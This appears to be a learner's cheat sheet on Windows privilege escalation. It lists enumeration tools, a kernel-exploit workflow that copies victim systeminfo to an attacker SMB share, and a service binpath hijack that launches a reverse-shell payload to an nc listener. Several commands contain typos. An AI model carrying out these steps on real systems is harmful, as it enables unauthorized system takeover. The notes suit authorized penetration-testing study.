                                                                      POWERUP
Powerup is a tool that can help you find privilege escalation vulnerabilities

enter powershell:
powershell -exec bypass

run the powerup script:
. ./Powerup.psq

then run the invoke all checks function:
Invoke-AllChecks

--------------------------------------------------------------------------------------------------------------------------------------------------------------------

                                                                     SEATBELT
seatbelt is another script for trying to find privilege escalation vulnerabilities 

if you just wanted seatbelt to list non-standard services:
.\Seatbelt.exe NonstandardServices

run all enumeration checks seatbelt has to offer
.\Seartbelt.exe all

--------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                                                          WINPEAS

winPEAS is a very powerfull tool that not only aactively hunts for privilege escalation misconfigurations but highlights them for the user in the results

before running winPEAS add the following registry key:
reg add HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1

look at the different type of checks winpeas can do:
./winPEASany.exe -h

--------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                                                        ACCESSCHK.EXE
                                                                 
accessChk is an old but still trustworhy tool for checking user access control rights

you can use it to check weather a user or group has access to files, directories, services and registry keys.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                                                          KERNEL EXPLOITS

steps to take to identify potential kernel exploits:

1. set up an smb server on the attacking machine
  a. /usr/share/doc/python-impacket/examples/smbserver.py tools .

2. on the victim machine run the systeminfo command and transfer the output to the attacking machine:
  b. systeminfo > \\192.168.1.244\tools\systeminfo
  
3. next on the attacking machine run the wes.py script to parse the systeminfo file for vulnerabilities
  c. python wes.py /root/windows-privesc/systeminfo.txt -i 'Elevation of Privilege' --exploits-only | more
  
4. follow the instructions in the exploit and run them.

--------------------------------------------------------------------------------------------------------------------------------------------------------------------
                                                                          SERVICE EXPLOITS
query the configuration of a service:
sc.exe qc <name>

query the current satus of a service
sc.exe query <name>

modify a configuration option of a service:
sc.exe config <name> <option>= <value>

Start/Stop a service:
net start/strop <name>

                                                                   insecure service permissions
to enumerate insecure service permissions with winpeas use this command:
winPeasany.exe quiet servicesinfo 

if there is a service winpeas says is modifyable we can check with accesschk.exe:
accesschk.exe /accepteula -uwcqv <username> <service>

make sure you see this output come from the above command:
SERVICE_CHANGE_CONFIG
SERVICE_START
SERVICE_STOP

next query the services configuration to get some details:
sc qc daclsvc

check the current state of the service:
sc query daclsvc

change the path of the service to where our reverse shell payload is stored:
sc config <service> binpath= "\"C:\PrivEsc\reverse.exe\""

start a listner in kali"
nc -nlvp 1337

start the service on the victim machine 
net start <service>

DONE PRIVESC





